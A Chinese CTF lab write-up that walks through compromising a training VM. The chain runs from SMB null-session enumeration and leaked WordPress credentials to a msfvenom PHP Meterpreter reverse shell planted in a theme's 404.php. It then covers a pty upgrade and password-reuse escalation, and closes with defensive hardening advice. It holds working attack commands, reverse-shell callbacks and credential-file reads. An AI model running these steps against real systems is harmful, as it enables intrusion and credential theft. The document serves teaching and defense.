---
title: CTF 实战：从 SMB 空会话枚举到 WordPress Meterpreter 反弹 Shell 与本地提权全链路复现
description: 完整复现 CTF 靶机渗透测试全流程：SMB 空会话枚举共享目录、下载敏感文件获取 WordPress 数据库凭证、后台主题编辑器上传 PHP
  Meterpreter 后门、反弹 Shell 并通过本地用户密码复用横向提权获取 Flag。
category: program-analysis
tags:
- CTF
- SMB
- Null Session
- WordPress
- Meterpreter
- Privilege Escalation
- Metasploit
- msfvenom
- Post Exploitation
- Writeup
date: '2024-01-15'
updated: '2026-11-15'
---

## 概述

本页面记录一次完整的 CTF 靶机渗透测试实战复现，攻击链覆盖 **信息收集 → SMB 空会话枚举 → 敏感文件下载凭证泄露 → WordPress 后台弱口令登录 → 主题编辑器上传 PHP Meterpreter 后门 → 反弹 Shell 交互升级 → 本地用户密码复用提权 → Flag 获取** 的全链路过程。适合作为渗透测试基础教学、OSCP 风格实战练习及红队初始访问与后渗透技术的参考案例。

> 实战环境：攻击机 Kali (172.20.236.105) → 靶机 Ubuntu (172.20.208.65 / 192.168.234.130)

---

## 攻击链全景图

```mermaid
flowchart TD
    A[端口扫描 nmap -sV -A] --> B[发现 SMB 139/445 及 HTTP 80]
    B --> C[SMB 空会话枚举共享目录]
    C --> D[smbclient 登录 share$ 空密码成功]
    D --> E[下载 deets.txt robots.txt todolist.txt]
    E --> F[获取 WP 配置文件 wp-config.php]
    F --> G[解析数据库凭证 Admin / TogieMYSQL12345^^]
    G --> H[尝试 MySQL/SSH 登录失败]
    H --> I[HTTP 目录扫描 dirb 发现 /wordpress/wp-admin/]
    I --> J[WordPress 后台登录成功]
    J --> K[主题编辑器修改 404.php 注入 Meterpreter]
    K --> L[msfvenom 生成 php/meterpreter/reverse_tcp]
    L --> M[MSF handler 监听 4444]
    M --> N[访问 404.php 触发反弹 Shell]
    N --> O[Python pty 升级交互式 TTY]
    O --> P[/etc/passwd 发现用户 togie]
    P --> Q[复用 SMB 泄露密码 12345 su togie]
    Q --> R[获取 Flag]
```

---

## 详细复现步骤

### 信息收集与服务枚举

#### Nmap 全端口服务探测

```bash
# 基础服务版本探测
nmap -sV 192.168.234.130

# 全量激进扫描（OS 指纹、脚本、T4 时序）
nmap -A -v -T4 192.168.234.130
```

**关键发现**：
- `139/tcp`  `netbios-ssn`  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
- `445/tcp`  `microsoft-ds`  Samba smbd 3.X - 4.X
- `80/tcp`   `http`         Apache httpd 2.4.x (Ubuntu)
- `22/tcp`   `ssh`          OpenSSH 7.x

> 💡 **交叉引用**：SMB 协议基础与命名管道机制详见 [[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]]。

---

### SMB 空会话枚举与敏感文件下载

#### 列举共享目录

```bash
# 匿名列举共享
smbclient -L 192.168.234.130
```

输出显示可用共享：`print$`、`share$` 等。

#### 尝试空密码登录各共享

```bash
# print$ 失败
smbclient '\\192.168.234.130\print$'

# share$ 成功（空密码）
smbclient '\\192.168.234.130\share$'
```

#### 下载关键文件

```bash
# 在 smbclient 交互模式下
get deets.txt
get robots.txt
get todolist.txt
```

#### 文件内容分析

| 文件 | 关键信息 |
|------|----------|
| `robots.txt` | 反爬目录提示 |
| `deets.txt` | **共享目录凭证：用户名 `share` 密码 `12345`** |
| `todolist.txt` | 运维待办事项，暗示 WordPress 配置文件位置 |

> 💡 **技巧**：SMB 空会话枚举是内网渗透初期常见的低成本信息收集手法，详见 [[internal-network-pivoting-techniques#smb-枚举与横向移动]]。

---

### 深入 SMB 获取 WordPress 配置凭证

#### 使用泄露凭证重新登录 share$

```bash
smbclient '\\192.168.234.130\share$' -U share%12345
```

#### 下载 WordPress 核心配置文件

```bash
get wp-config.php
get wp-config-sample.php
get wp-comments-post.php
```

#### 解析 `wp-config.php` 获取数据库凭证

```php
define('DB_USER', 'Admin');
define('DB_PASSWORD', 'TogieMYSQL12345^^');
```

> ⚠️ **注意**：此处获得的数据库凭证**不可直接用于 MySQL 远程登录**（默认仅本地 Unix socket），也不可用于 SSH 登录。需结合 Web 层面进一步利用。

---

### Web 层面突破：WordPress 后台 Getshell

#### 目录扫描发现 WordPress 后台

```bash
dirb http://192.168.234.130
# 发现 http://192.168.234.130/wordpress/wp-admin/
```

#### 后台弱口令登录

尝试使用数据库凭证或常见弱口令，**成功登录**：
- 用户名：`Admin`
- 密码：`TogieMYSQL12345^^`

> 💡 **交叉引用**：WordPress 后台插件/主题上传 Getshell 典型案例见 [[vulnhub-admx-new-writeup]]、[[php-webshell-fundamentals-chopper-analysis#wordpress-主题编辑器上传-webshell]]。

#### 生成 PHP Meterpreter 后门

```bash
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=192.168.234.128 LPORT=4444 \
  -f raw > /root/Desktop/shell.php
```

> 💡 **交叉引用**：`msfvenom` Payload 生成与编码免杀详见 [[metasploit-framework-basics-tutorial#msfvenom-木马生成与编码免杀]]。

#### 通过主题编辑器植入后门

1. 后台进入 **Appearance → Theme Editor**
2. 选择 **404 Template (404.php)**（主题 `twentyfifteen` 或 `twentyfourteen`）
3. 清空原内容，粘贴 `shell.php` 代码
4. 点击 **Update File** 保存

#### MSF 监听器配置

```bash
msfconsole
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set LHOST 192.168.234.128
set LPORT 4444
run
```

#### 触发反弹 Shell

访问后门页面：
```
http://192.168.234.130/wordpress/wp-content/themes/twentyfifteen/404.php
```

MSF 成功接收 Meterpreter 会话。

> 💡 **交叉引用**：Meterpreter 会话管理、路由添加、SOCKS 代理搭建用于内网横向移动详见 [[internal-network-pivoting-techniques#meterpreter-路由与-socks-代理]]、[[xd-security-internal-network-penetration-notes-day69-70#cobalt-strike-与-metasploit-双向会话移交]]。

---

### 会话交互升级与后渗透枚举

#### 升级为交互式 TTY

```bash
# 在 Meterpreter shell 中执行
shell
python -c "import pty; pty.spawn('/bin/bash')"
# 或
python3 -c "import pty; pty.spawn('/bin/bash')"
```

#### 本地用户枚举

```bash
cat /etc/passwd
# 发现用户 togie:x:1000:1000:togie,,,:/home/togie:/bin/rbash
```

#### 密码复用提权（横向 → 纵向）

利用 SMB 阶段泄露的 `deets.txt` 中密码 `12345` 尝试切换用户：

```bash
su togie
# Password: 12345
```

成功切换到 `togie` 用户（从 `www-data` 提权至普通用户）。

> 💡 **核心思路**：渗透测试中**凭证复用**是横向移动与提权的高频手法。SMB 枚举、Web 配置文件泄露、备份文件下载均可能产生可复用凭证。详见 [[xd-security-pentest-basic-stage-notes#凭证收集与复用]]、[[xd-security-internal-network-penetration-notes-day65-66#凭证获取与横向移动]]。

---

### Flag 获取

```bash
cd /home/togie
ls -la
cat flag.txt   # 或 user.txt / root.txt 视靶机设定
```

---

## 关键技术点总结

| 阶段 | 核心技术 | 关键工具/命令 | 防御视角建议 |
|------|----------|---------------|--------------|
| **SMB 枚举** | 空会话、共享列举、匿名读取 | `smbclient -L`, `smbclient //ip/share$` | 禁用 Null Session、限制匿名共享访问、审计 SMB 签名 |
| **敏感文件泄露** | 配置文件下载、凭证硬编码 | `get wp-config.php` | 最小权限原则、配置文件移出 Web 目录、敏感信息加密存储 |
| **WordPress Getshell** | 后台主题编辑器 PHP 代码执行 | Theme Editor → 404.php、msfvenom | 禁用文件编辑 `DISALLOW_FILE_EDIT`、强密码策略、WAF 规则拦截恶意 PHP 函数 |
| **Meterpreter 反弹** | PHP `meterpreter/reverse_tcp`、MSF Handler | `msfvenom`, `exploit/multi/handler` | 出站流量监控、EDR 行为分析、应用层防火墙限制 PHP 危险函数 |
| **TTY 升级** | Python pty spawn、Script 伪终端 | `python -c "import pty; pty.spawn('/bin/bash')"` | 审计异常进程生成、限制解释器执行权限 |
| **本地提权** | 密码复用 `su`、SUID/能力滥用、内核漏洞 | `su togie`, `find / -perm -4000 2>/dev/null` | 最小权限、密码策略、定期内核补丁、SUID 审计 |

---

## 扩展阅读与关联页面

| 方向 | 关联页面 | 说明 |
|------|----------|------|
| **Metasploit 基础与 Payload 生成** | [[metasploit-framework-basics-tutorial]] | msfvenom 编码免杀、Handler 配置、后渗透模块 |
| **PHP Webshell 原理与 WordPress 上传实战** | [[php-webshell-fundamentals-chopper-analysis]] | 一句话木马、蚁剑/菜刀连接、Content-Type 绕过 |
| **WordPress 插件/主题 Getshell 案例** | [[vulnhub-admx-new-writeup]] | 插件上传、MySQL UDF 提权完整链路 |
| **内网穿透与横向移动体系** | [[internal-network-pivoting-techniques]] | Meterpreter/Cobalt Strike/Frp/SSH 多隧道技术对比 |
| **SMB 协议安全与 C2 通信** | [[smb-named-pipe-c2-communication]]、[[named-pipe-smb-detection-sysmon]] | 命名管道原理、SMB Beacon、Sysmon Event ID 17/18 检测 |
| **渗透测试基础阶段知识体系** | [[xd-security-pentest-basic-stage-notes]] | Web 基础、SQL注入、文件上传、WAF绕过结构化笔记 |
| **实战内网渗透 Day69-70** | [[xd-security-internal-network-penetration-notes-day69-70]] | Cobalt Strike 团队服务、Beacon 上线、SOCKS 代理三层内网演练 |

---

## 复现检查清单（Checklist）

- [ ] 目标存活确认与端口扫描（nmap -sV/-A）
- [ ] SMB 空会话枚举共享（smbclient -L）
- [ ] 匿名/弱口令登录共享下载敏感文件
- [ ] 解析配置文件提取数据库/Web 凭证
- [ ] Web 目录扫描发现管理后台（dirb/nikto）
- [ ] 后台弱口令/凭证复用登录
- [ ] msfvenom 生成对应语言 Meterpreter Payload
- [ ] 利用文件上传/编辑器/模板注入植入后门
- [ ] MSF Handler 监听并接收会话
- [ ] Shell 交互升级（pty/spawn/script）
- [ ] 后渗透枚举（用户、进程、网络、计划任务、SUID）
- [ ] 凭证复用/漏洞利用/配置错误提权
- [ ] Flag 读取与痕迹清理

---

## 结语

本案例展示了**外网单点突破 → 内网凭证收集 → Web 应用层代码执行 → 会话建立与交互升级 → 本地权限提升**的经典渗透测试全链路。每个环节均对应成熟的攻击技术与相应的检测缓解措施，建议防御方重点关注：

1. **SMB 安全配置**：禁用 SMBv1、强制签名、限制匿名枚举
2. **Web 应用加固**：禁用在线文件编辑、强密码+MFA、WAF 规则覆盖高危函数
3. **出站流量管控**：服务器禁止主动外连、异常长连接告警
4. **主机入侵检测**：Sysmon 记录进程创建/网络连接、EDR 行为分析 Meterpreter 特征
5. **最小权限与凭证卫生**：服务账号隔离、定期轮换、禁止跨系统复用

> 页面持续维护中，欢迎补充更多变体利用链（如 WP REST API、XML-RPC、插件漏洞等）与蓝队检测规则。

## 来源

- [0x00实验室-202108-202304_109](../sources/0x00实验室-202108-202304_109.md)
